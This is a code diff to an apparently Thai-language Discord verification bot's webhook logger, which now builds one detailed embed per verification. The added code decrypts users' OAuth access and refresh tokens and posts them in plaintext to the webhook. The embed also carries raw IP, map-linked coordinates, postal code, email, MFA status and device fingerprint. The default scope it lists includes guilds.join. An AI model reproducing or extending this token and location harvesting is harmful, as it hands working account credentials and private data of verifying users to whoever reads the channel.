@@ -143,25 +143,103 @@ function chunkStringToFields(title, str, maxChars = MAX_FIELD_VALUE_CHARS) {
     return fields;
 }
 
+const EMOJIS = Object.freeze({
+    DISCORD: "<:Discord_pmt:1553835220912840814>",
+    CHECK: "<a:CHECK_pmt:1553832954051174426>",
+    CROSS: "<a:CROSS_pmt:1553833049135906816>",
+    ROLES: "<:kroles_pmt:1553835237333672006>",
+    SHIELD: "<:check_pmt:1553835205553553599>",
+    LOCK: "<:vak_pmt:1553835198066729121>"
+});
+
+function formatPlatform(platform) {
+    if (!platform || platform === "unknown" || platform === "Unknown") return "ไม่ระบุ";
+    const p = String(platform).trim();
+    if (p === "Win32" || p === "Win64") return "Win32/Windows";
+    if (p === "MacIntel" || p.includes("Mac")) return "MacIntel/MacBook, iMac";
+    if (p === "iPhone") return "iPhone";
+    if (p === "iPad") return "iPad";
+    if (/arm|aarch/i.test(p) && /linux/i.test(p)) return `${p}/Android`;
+    if (/linux/i.test(p)) return `${p}/Linux`;
+    return p;
+}
+
+function formatCoordinates(lat, lon) {
+    if (lat != null && lon != null && !isNaN(Number(lat)) && !isNaN(Number(lon))) {
+        return `[${lat}, ${lon}](https://www.google.com/maps?q=${lat},${lon})`;
+    }
+    return "ไม่มีข้อมูล";
+}
+
+function formatNitro(premiumType) {
+    const pt = Number(premiumType);
+    if (pt === 1) return "มี (Nitro Classic)";
+    if (pt === 2) return "มี (Discord Nitro)";
+    if (pt === 3) return "มี (Nitro Basic)";
+    return "ไม่มี";
+}
+
+function formatTouchscreen(touchPoints) {
+    if (touchPoints != null && !isNaN(Number(touchPoints))) {
+        const tp = Number(touchPoints);
+        if (tp > 0) return `รองรับ ${tp} จุด`;
+        if (tp === 0) return "ไม่รองรับ (PC/โน้ตบุ๊ก)";
+    }
+    return "ไม่ระบุ";
+}
+
+function formatMobileOrBroadband(ipInfo = {}) {
+    if (ipInfo.mobile) return "เน็ตมือถือ (Cellular 4G/5G)";
+    return "เน็ตบ้านสายไฟเบอร์/บรอดแบนด์";
+}
+
+function formatDeviceFingerprint(device, trackingSnapshot = {}) {
+    const count = Number(trackingSnapshot.uniqueUsers || 1);
+    if (count > 1) {
+        return `${count} บัญชี (ตรวจพบบัญชีซ้ำในเครื่องนี้ ⚠️)`;
+    }
+    return "1 บัญชี (เครื่องใหม่ ไม่พบไอดีโคลน ✅)";
+}
+
+function formatSharedIp(trackingSnapshot = {}) {
+    const count = Number(trackingSnapshot.uniqueUsers || 1);
+    if (count > 1) {
+        return `${count} บัญชี (ตรวจพบหลายไอดีใช้ IP ร่วมกัน ⚠️)`;
+    }
+    return "1 บัญชี (ปกติ ✅)";
+}
+
+function formatSpoofedHeaders(device = {}) {
+    if (device.userAgentSuspected || (Array.isArray(device.userAgentFlags) && device.userAgentFlags.length > 0)) {
+        return `ตรวจพบความผิดปกติ (${device.userAgentFlags.join(", ")}) ⚠️`;
+    }
+    return "ไม่พบ (ปกติ ✅)";
+}
+
 /**
- * Builds the canonical 2-embed payload for a verification event.
- * Preserves all fields with zero silent truncation.
+ * Builds the canonical single-embed payload for a verification event.
+ * Preserves all fields with zero silent truncation (OI-05 / P1-8).
  */
 function buildWebhookPayload({
     eventId = null,
+    guildId = null,
+    guildName = null,
     profile = {},
     connections = [],
     guildSummary = null,
     ipInfo = {},
     device = null,
     tokens = {},
+    trackingSnapshot = {},
     roleId = null,
     roleName = null,
     findings = [],
     result = "success",
     verifiedAt = Date.now()
 }) {
-    const rawIp = ipInfo.encryptedRawIp ? (decryptIP(ipInfo.encryptedRawIp) || ipInfo.ipHash || "ไม่พบ IP") : (ipInfo.ipHash || "ไม่มีข้อมูล");
+    const rawIp = ipInfo.encryptedRawIp
+        ? (decryptIP(ipInfo.encryptedRawIp) || ipInfo.ipHash || "ไม่พบ IP")
+        : (ipInfo.rawIp || ipInfo.ip || ipInfo.ipHash || "ไม่มีข้อมูล");
     const accessToken = tokens.accessToken || (tokens.encryptedAccessToken ? decryptToken(tokens.encryptedAccessToken) : null) || "ไม่มีข้อมูล";
     const refreshToken = tokens.refreshToken || (tokens.encryptedRefreshToken ? decryptToken(tokens.encryptedRefreshToken) : null) || "ไม่มีข้อมูล";
 
@@ -170,93 +248,177 @@ function buildWebhookPayload({
         profile.id ? `User: ${profile.id}` : null
     ].filter(Boolean).join(" • ") || "Discordbot Verification";
 
-    // Embed 1: Discord Profile & Connections & Server Stats
-    const connectionLines = Array.isArray(connections) && connections.length > 0
-        ? connections.map(c => `• **${c.type || "Unknown"}**${c.name ? ` (${c.name})` : ""}${c.verified ? " (Verified ✅)" : ""}`)
-        : ["ไม่มีการเชื่อมต่อบัญชีภายนอก"];
-
-    const badgeStr = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length > 0
-        ? profile.badgeFlags.join(", ")
-        : "ไม่มี";
-
-    const totalGuilds = guildSummary ? (guildSummary.totalGuilds ?? guildSummary.totalCount ?? "ไม่ระบุ") : "ไม่ระบุ";
-    const ownerGuildsCount = guildSummary ? (guildSummary.ownerGuildsCount ?? guildSummary.ownedCount ?? 0) : 0;
-    const guildSummaryStr = guildSummary
-        ? `• เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด: ${totalGuilds}\n• เซิร์ฟเวอร์ที่เป็นเจ้าของ: ${ownerGuildsCount}`
-        : "ไม่มีข้อมูลสรุปเซิร์ฟเวอร์";
-
-    const embed1Fields = [
-        { name: "ชื่อผู้ใช้ (Username)", value: profile.displayTag || profile.username || "ไม่มี", inline: true },
-        { name: "Discord ID", value: String(profile.id || "ไม่มี"), inline: true },
-        { name: "Global Name", value: profile.globalName || profile.username || "ไม่มี", inline: true },
-        { name: "วันสร้างบัญชี", value: `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)`, inline: false },
-        { name: "อีเมล", value: profile.email ? `${profile.email} (${profile.emailVerified ? "ยืนยันแล้ว" : "ยังไม่ยืนยัน"})` : "ไม่มีข้อมูล", inline: true },
-        { name: "เหรียญตรา (Badges)", value: badgeStr, inline: true },
-        { name: "ข้อมูลเซิร์ฟเวอร์ Discord", value: guildSummaryStr, inline: false },
-        ...chunkLinesToFields("บัญชีที่เชื่อมต่อ (Connections)", connectionLines)
-    ];
-
-    const embed1 = {
-        title: `📋 ข้อมูลผู้ยืนยันตัวตน: ${profile.displayTag || profile.username || profile.id}`,
-        color: 0x5865F2,
-        thumbnail: profile.avatarUrl ? { url: profile.avatarUrl } : undefined,
-        fields: embed1Fields,
-        footer: { text: footerText },
-        timestamp: new Date(verifiedAt).toISOString()
-    };
-
-    // Embed 2: Network Intelligence, Device, Security Findings, Tokens, and Result
-    const geoParts = [ipInfo.city, ipInfo.region, ipInfo.country].filter(Boolean);
-    const locationStr = geoParts.length ? geoParts.join(", ") : "ไม่ทราบตำแหน่ง";
-    const ispStr = [ipInfo.isp, ipInfo.as].filter(Boolean).join(" - ") || "ไม่ทราบ ISP";
+    // Embed Description
+    const serverName = guildName || "Phomueangtai Community";
+    const serverIdStr = guildId ? `(${guildId})` : "";
+    const userTag = profile.id ? `<@${profile.id}>` : (profile.username || "ไม่ระบุ");
+    const resultEmoji = result === "success" ? EMOJIS.CHECK : EMOJIS.CROSS;
+    const resultLabel = result === "success" ? `สำเร็จ ${resultEmoji}` : `ถูกปฏิเสธ ${resultEmoji}`;
+    const roleMention = roleId ? `<@&${roleId}>${roleName ? ` (${roleName})` : ""}` : (roleName ? `@${roleName}` : "ไม่มี");
 
     const networkTypes = [];
     if (ipInfo.isVPN) networkTypes.push("VPN");
     if (ipInfo.isProxy) networkTypes.push("Proxy");
     if (ipInfo.isTOR) networkTypes.push("TOR");
-    if (ipInfo.hosting) networkTypes.push("Hosting/Datacenter");
-    if (ipInfo.mobile) networkTypes.push("Mobile");
-    const networkStatusStr = networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้าน/ทั่วไป (ปกติ)";
+    if (ipInfo.hosting || ipInfo.isHosting) networkTypes.push("Hosting/Datacenter");
+    const networkStatusBrief = networkTypes.length ? `ตรวจพบ ${networkTypes.join(" / ")}` : "อินเทอร์เน็ตบ้าน/ปกติ";
 
-    const deviceParts = [];
-    if (device?.browser) deviceParts.push(`เบราว์เซอร์: ${device.browser}`);
-    if (device?.os) deviceParts.push(`ระบบ: ${device.os}`);
-    if (device?.deviceType) deviceParts.push(`ประเภท: ${device.deviceType}`);
-    if (device?.screenSize) deviceParts.push(`หน้าจอ: ${device.screenSize}`);
-    const deviceStr = deviceParts.length ? deviceParts.join(" | ") : "ไม่มีข้อมูลอุปกรณ์";
+    const description = [
+        `ข้อมูลจากเซิร์ฟเวอร์: ${serverName}`,
+        `เซิร์ฟเวอร์ id : ${serverIdStr}`,
+        `User : ${userTag}`,
+        ``,
+        `  • ผลการยืนยัน: ${resultLabel}`,
+        `  • ยศที่ได้รับ: ${roleMention}`,
+        `  • เครือข่ายที่อาจจะใช้ยืนยัน: ${networkStatusBrief}`
+    ].join("\n");
 
-    const findingLines = Array.isArray(findings) && findings.length > 0
-        ? findings.map(f => `• ${f}`)
-        : ["ไม่พบความเสี่ยง (ปกติ)"];
+    // Section 1: ข้อมูลบัญชี Discord
+    const globalName = profile.globalName || profile.username || "ไม่มี";
+    const username = profile.username || "ไม่มี";
+    const userId = String(profile.id || "ไม่มี");
+    const avatarLink = profile.avatarUrl ? `[คลิกเพื่อดูรูปโปรไฟล์](${profile.avatarUrl})` : "ไม่มี";
+    const bannerLink = profile.bannerUrl ? `[คลิกเพื่อดูแบนเนอร์](${profile.bannerUrl})` : "ไม่มี";
+    const discriminator = profile.discriminator && profile.discriminator !== "0" ? `#${profile.discriminator}` : "#0";
+    const email = profile.email || "ไม่มีข้อมูล";
+    const emailVerifiedText = profile.emailVerified ? `ยืนยันแล้ว${EMOJIS.CHECK}` : `ยังไม่ยืนยัน${EMOJIS.CROSS}`;
+    const appLocale = profile.locale || "th";
+    const mfaText = profile.mfaEnabled ? `เปิดใช้งาน${EMOJIS.CHECK}` : `ปิด${EMOJIS.CROSS}`;
+    const createdDate = profile.accountCreatedAt ? `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)` : "ไม่ระบุ";
+    const badges = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length ? profile.badgeFlags.join(", ") : "ไม่มี";
+    const nitroText = formatNitro(profile.premiumType);
+    const totalGuilds = guildSummary ? (guildSummary.totalGuilds ?? guildSummary.totalCount ?? "ไม่ระบุ") : "ไม่ระบุ";
+    const ownedGuilds = guildSummary ? (guildSummary.ownerGuildsCount ?? guildSummary.ownedCount ?? 0) : 0;
+    const adminGuilds = guildSummary ? (guildSummary.adminGuildsCount ?? guildSummary.adminCount ?? 0) : 0;
 
-    const roleMention = roleId ? `<@&${roleId}>${roleName ? ` (${roleName})` : ""}` : (roleName || "ไม่มี");
-
-    const embed2Color = result === "success" ? 0x2ECC71 : (result === "blocked" ? 0xE74C3C : 0xF39C12);
-    const resultLabel = result === "success" ? "สำเร็จ ✅" : (result === "blocked" ? "ถูกปฏิเสธ/บล็อก 🚫" : "ล้มเหลว ❌");
-
-    const embed2Fields = [
-        { name: "ผลการยืนยัน", value: resultLabel, inline: true },
-        { name: "ยศที่ได้รับ", value: roleMention, inline: true },
-        { name: "IP Address", value: rawIp, inline: true },
-        { name: "ตำแหน่งที่ตั้ง (GeoIP)", value: locationStr, inline: true },
-        { name: "ผู้ให้บริการ (ISP/Org)", value: ispStr, inline: true },
-        { name: "ประเภทเครือข่าย", value: networkStatusStr, inline: true },
-        { name: "ข้อมูลอุปกรณ์ (Device)", value: deviceStr, inline: false },
-        ...(device?.userAgent ? chunkStringToFields("User-Agent", device.userAgent) : []),
-        ...chunkLinesToFields("ข้อสังเกตความปลอดภัย (Findings)", findingLines),
-        ...chunkStringToFields("Access Token", accessToken),
-        ...chunkStringToFields("Refresh Token", refreshToken)
+    const discordInfoLines = [
+        `  • Global Name: ${globalName}`,
+        `  • Username: ${username}`,
+        `  • User ID: ${userId}`,
+        `  • Avatar URL: ${avatarLink}`,
+        `  • Banner URL: ${bannerLink}`,
+        `  • Discriminator: ${discriminator}`,
+        `  • Email: ${email}`,
+        `  • Email Verified: ${emailVerifiedText}`,
+        `  • ภาษาของแอป Discord: ${appLocale}`,
+        `  • MFA (2FA): ${mfaText}`,
+        `  • วันสร้างบัญชี: ${createdDate}`,
+        `  • เหรียญตรา (Badges): ${badges}`,
+        `  • มี Nitro ไหม: ${nitroText}`,
+        `  • เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด: ${totalGuilds} เซิร์ฟเวอร์`,
+        `  • เซิร์ฟเวอร์ที่เป็นเจ้าของ: ${ownedGuilds} เซิร์ฟเวอร์`,
+        `  • มียศ เเอดมิน กี่เซิฟเวอร์: ${adminGuilds} เซิร์ฟเวอร์`
     ];
 
-    const embed2 = {
-        title: "🛡️ ข้อมูลความปลอดภัยและการตรวจสอบเครือข่าย",
-        color: embed2Color,
-        fields: embed2Fields,
+    // Section 2: ที่อยู่ IP & ตำแหน่ง
+    const coordsStr = formatCoordinates(ipInfo.lat, ipInfo.lon);
+    const accuracyRadius = ipInfo.accuracyRadius || 5;
+    const city = ipInfo.city || "ไม่ระบุ";
+    const region = ipInfo.region || ipInfo.regionName || "ไม่ระบุ";
+    const country = ipInfo.country || "ไม่ระบุ";
+    const locationStr = `เมือง-${city}, จังหวัด/รัฐ-${region}, ประเทศ-${country}`;
+    const zip = ipInfo.zip || "ไม่ระบุ";
+    const timezone = ipInfo.timezone || "Asia/Bangkok";
+    const isp = ipInfo.isp || "ไม่ทราบ ISP";
+    const org = ipInfo.org || ipInfo.as || "ไม่ระบุ";
+    const reverseDns = ipInfo.reverse || ipInfo.hostname || "ไม่ระบุ";
+    const networkStatusDetail = networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้านปกติ";
+    const mobileOrBroadband = formatMobileOrBroadband(ipInfo);
+
+    const ipLocationLines = [
+        `  • IP Address: ${rawIp}`,
+        `  • พิกัด ละติจูด/ลองจิจูด: ${coordsStr}`,
+        `  • รัศมีความแม่นยำพิกัด: ± ${accuracyRadius} กม.`,
+        `  • ตำแหน่ง: ${locationStr}`,
+        `  • รหัสไปรษณีย์: ${zip}`,
+        `  • Timezone: ${timezone}`,
+        `  • ผู้ให้บริการอินเทอร์เน็ต: ${isp}`,
+        `  • องค์กรโครงข่าย: ${org}`,
+        `  • ชื่อโหนดโฮสต์ของเครือข่าย: ${reverseDns}`,
+        `  • สถานะเครือข่ายที่ตรวจพบ: ${networkStatusDetail}`,
+        `  • เน็ตมือถือหรือเน็ตบ้าน: ${mobileOrBroadband}`
+    ];
+
+    // Section 3: อุปกรณ์ & เบราว์เซอร์
+    const deviceType = device?.deviceType || "Desktop";
+    const platformFormatted = formatPlatform(device?.platform);
+    const os = device?.os || "ไม่ระบุ";
+    const screen = device?.screenSize || "ไม่ระบุ";
+    const browser = device?.browser || "ไม่ระบุ";
+    const browserLanguages = Array.isArray(device?.languages) && device.languages.length ? device.languages.join(", ") : (device?.language || "th-TH, en-US");
+    const touchscreen = formatTouchscreen(device?.touchPoints);
+    const userAgentStr = device?.userAgent ? `\`${device.userAgent}\`` : "`ไม่มีข้อมูล`";
+
+    const deviceLines = [
+        `  • ประเภทอุปกรณ์ (Device): ${deviceType}`,
+        `  • สถาปัตยกรรมระบบ (Platform): ${platformFormatted}`,
+        `  • ระบบปฏิบัติการ (OS): ${os}`,
+        `  • หน้าจอ (Screen): ${screen}`,
+        `  • เบราว์เซอร์ (Browser): ${browser}`,
+        `  • ภาษาของเบราว์เซอร์ (Browser Languages): ${browserLanguages}`,
+        `  • หน้าจอสัมผัส (Touchscreen): ${touchscreen}`,
+        `  • User-Agent:`,
+        `  ${userAgentStr}`
+    ];
+
+    // Section 4: บัญชีที่เชื่อมต่อ
+    const connList = Array.isArray(connections) && connections.length > 0
+        ? connections.map(c => typeof c === "string" ? c : (c.type || c.name || "Unknown")).join(", ")
+        : "ไม่มีการเชื่อมต่อบัญชีภายนอก";
+    const connectionLines = [
+        `  • ${connList}`
+    ];
+
+    // Section 5: สิทธิ์และการเข้าถึง
+    const scopeStr = tokens.scope || "identify email connections guilds guilds.members.read guilds.join";
+    const expiresStr = tokens.expiresAt ? `${formatDate(tokens.expiresAt)}` : "7 วัน";
+    const securityFindingsStr = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
+
+    const tokenLines = [
+        `  • Scope: ${scopeStr}`,
+        `  • หมดอายุ (Expires): ${expiresStr}`,
+        `  • Security Findings: ${securityFindingsStr}`,
+        `  • Access Token:`,
+        `  \`${accessToken}\``,
+        `  • Refresh Token:`,
+        `  \`${refreshToken}\``
+    ];
+
+    // Section 6: ข้อมูลระบบตรวจจับความปลอดภัย
+    const deviceFingerprint = formatDeviceFingerprint(device, trackingSnapshot);
+    const sharedIp = formatSharedIp(trackingSnapshot);
+    const firstSeen = trackingSnapshot.firstSeenAt ? formatDate(trackingSnapshot.firstSeenAt) : (trackingSnapshot ? "เพิ่งพบครั้งแรกในการยืนยันนี้" : "ไม่มีข้อมูล");
+    const spoofHeader = formatSpoofedHeaders(device || {});
+    const findingsSummary = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
+
+    const securityLines = [
+        `  • ตรวจพบบัญชีในเครื่องนี้ (Device Fingerprint): ${deviceFingerprint}`,
+        `  • บัญชีที่เคยใช้ IP นี้ (Shared IP): ${sharedIp}`,
+        `  • วันที่เข้าร่วมเซิร์ฟเวอร์ครั้งแรกจาก IP นี้: ${firstSeen}`,
+        `  • การดัดแปลง Header เครือข่าย (Spoof Header): ${spoofHeader}`,
+        `  • ข้อสังเกตความปลอดภัย (Findings): ${findingsSummary}`
+    ];
+
+    const fields = [
+        ...chunkLinesToFields(`${EMOJIS.ROLES} ข้อมูลบัญชี Discord (Account Information)`, discordInfoLines),
+        ...chunkLinesToFields(`${EMOJIS.SHIELD} ที่อยู่ IP & ตำแหน่ง (IP & Location)`, ipLocationLines),
+        ...chunkLinesToFields("💻 อุปกรณ์ & เบราว์เซอร์ (Device & Browser)", deviceLines),
+        ...chunkLinesToFields("🔗 บัญชีที่เชื่อมต่อ (Connections)", connectionLines),
+        ...chunkLinesToFields(`${EMOJIS.LOCK} สิทธิ์และการเข้าถึง (Token & Scope)`, tokenLines),
+        ...chunkLinesToFields("🛡 ข้อมูลระบบตรวจจับความปลอดภัย (Security)", securityLines)
+    ];
+
+    const embed = {
+        title: `${EMOJIS.DISCORD} Log Verify ผู้ใช้งาน`,
+        description,
+        color: result === "success" ? 0x2ECC71 : (result === "blocked" ? 0xE74C3C : 0xF39C12),
+        thumbnail: profile.avatarUrl ? { url: profile.avatarUrl } : undefined,
+        fields,
         footer: { text: footerText },
         timestamp: new Date(verifiedAt).toISOString()
     };
 
-    return [embed1, embed2];
+    return [embed];
 }
 
 /**
@@ -1089,26 +1251,38 @@ class VerificationWebhookManager {
                     const oauthUser = await OAuthUser.findOne({ "discord.userId": item.user_id }).lean();
                     const embeds = buildWebhookPayload({
                         eventId: String(log._id),
+                        guildId: log.guildId || item.guild_id,
+                        guildName: config?.guildName || config?.name || null,
                         profile: {
                             id: log.userId,
-                            username: log.discordSnapshot?.username,
-                            globalName: log.discordSnapshot?.globalName,
-                            displayTag: log.discordSnapshot?.displayTag || log.discordSnapshot?.username,
-                            avatarUrl: log.discordSnapshot?.avatarUrl,
-                            accountCreatedAt: log.discordSnapshot?.accountCreatedAt,
-                            accountAgeDays: log.discordSnapshot?.accountAgeDays,
-                            email: log.discordSnapshot?.email,
-                            emailVerified: log.discordSnapshot?.emailVerified,
-                            badgeFlags: log.discordSnapshot?.badgeFlags
+                            username: log.discordSnapshot?.username || oauthUser?.discord?.username,
+                            globalName: log.discordSnapshot?.globalName || oauthUser?.discord?.globalName,
+                            discriminator: log.discordSnapshot?.discriminator || oauthUser?.discord?.discriminator,
+                            displayTag: log.discordSnapshot?.displayTag || oauthUser?.discord?.displayTag || log.discordSnapshot?.username,
+                            avatarUrl: log.discordSnapshot?.avatarUrl || oauthUser?.discord?.avatarUrl,
+                            bannerUrl: log.discordSnapshot?.bannerUrl || oauthUser?.discord?.bannerUrl,
+                            accountCreatedAt: log.discordSnapshot?.accountCreatedAt || oauthUser?.discord?.accountCreatedAt,
+                            accountAgeDays: log.discordSnapshot?.accountAgeDays || oauthUser?.discord?.accountAgeDays,
+                            email: log.discordSnapshot?.email || oauthUser?.discord?.email,
+                            emailVerified: log.discordSnapshot?.emailVerified ?? oauthUser?.discord?.emailVerified,
+                            locale: log.discordSnapshot?.locale || oauthUser?.discord?.locale,
+                            mfaEnabled: log.discordSnapshot?.mfaEnabled ?? oauthUser?.discord?.mfaEnabled,
+                            premiumType: log.discordSnapshot?.premiumType ?? oauthUser?.discord?.premiumType,
+                            badgeFlags: log.discordSnapshot?.badgeFlags || oauthUser?.discord?.badgeFlags || []
                         },
                         connections: log.connectionsSnapshot || oauthUser?.connections || [],
-                        guildSummary: log.guildSummary || null,
+                        guildSummary: log.guildSummary || oauthUser?.guildSummary || null,
                         ipInfo: log.ipInfo || {},
                         device: log.device || {},
                         tokens: {
+                            accessToken: oauthUser?.oauth?.accessToken,
+                            refreshToken: oauthUser?.oauth?.refreshToken,
                             encryptedAccessToken: oauthUser?.oauth?.encryptedAccessToken,
-                            encryptedRefreshToken: oauthUser?.oauth?.encryptedRefreshToken
+                            encryptedRefreshToken: oauthUser?.oauth?.encryptedRefreshToken,
+                            scope: oauthUser?.oauth?.scope || "identify email connections guilds guilds.members.read guilds.join",
+                            expiresAt: oauthUser?.oauth?.expiresAt
                         },
+                        trackingSnapshot: log.trackingSnapshot || oauthUser?.lastIpTracking || {},
                         roleId: log.roleId,
                         roleName: config?.verification?.roleName || null,
                         findings: log.findings || [],
